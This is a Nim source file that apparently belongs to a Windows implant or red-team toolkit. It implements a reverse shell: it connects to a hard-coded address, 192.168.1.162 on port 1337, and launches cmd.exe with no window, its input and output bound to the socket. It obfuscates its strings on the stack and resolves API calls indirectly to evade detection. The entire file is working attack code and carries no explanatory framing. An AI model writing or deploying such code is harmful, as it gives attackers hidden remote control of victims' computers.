import winim

import utils/[stackstr]
import instance

proc reverseShell*(): bool =
  var 
    sHost {.stackStringA.} = "192.168.1.162"
    sCmd {.stackStringA.}  = "cmd"
    port: uint16 = 1337
    wsaData: WSADATA
  var
    pCreateProcessA = ninst.Win32.CreateProcessA
    pWSAStartup     = ninst.Win32.WSAStartup
    pWSASocketA     = ninst.Win32.WSASocketA
    pinet_addr      = ninst.Win32.inet_addr
    phtons          = ninst.Win32.htons
    pconnect        = ninst.Win32.connect

  # call WSAStartup
  var wsaStartupRes = pWSAStartup(MAKEWORD(2,2), addr wsaData)

  # call WSASocket
  var socket = pWSASocketA(2, 1, 6, NULL, cast[GROUP](0), cast[DWORD](NULL))

  # create sockaddr_in struct
  var sa: sockaddr_in
  sa.sin_family = AF_INET
  sa.sinaddr.S_addr = pinet_addr(CPTR(sHost))
  sa.sin_port = phtons(port)

  # call connect
  var connectResult = pconnect(socket, cast[ptr sockaddr](sa.addr), cast[int32](sizeof(sa)))

  # call CreateProcessA
  var 
    si: STARTUPINFO
    pi: PROCESS_INFORMATION
  si.cb = cast[DWORD](sizeof(si))
  si.dwFlags = STARTF_USESTDHANDLES
  si.hStdInput = cast[HANDLE](socket)
  si.hStdOutput = cast[HANDLE](socket)
  si.hStdError = cast[HANDLE](socket)

  discard pCreateProcessA(
    NULL, cast[LPSTR](CPTR(sCmd)),
    NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL,
    cast[LPSTARTUPINFOA](si.addr), pi.addr
  )

  return true